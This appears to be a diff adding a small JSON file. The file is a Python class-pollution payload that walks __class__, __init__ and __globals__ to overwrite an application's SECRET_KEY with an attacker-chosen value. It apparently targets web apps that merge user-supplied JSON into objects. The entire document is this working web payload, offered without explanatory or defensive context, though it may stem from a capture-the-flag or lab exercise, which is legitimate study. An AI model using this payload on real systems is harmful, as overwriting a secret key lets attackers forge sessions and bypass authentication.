@@ -1,0 +1,10 @@
+{ 
+    "secret_key": "i rewrote the key",
+    "__class__": {
+    	"__init__": {
+    	    "__globals__": {
+    	    	"SECRET_KEY": "i rewrote the key"
+	    }
+	}
+    }
+}
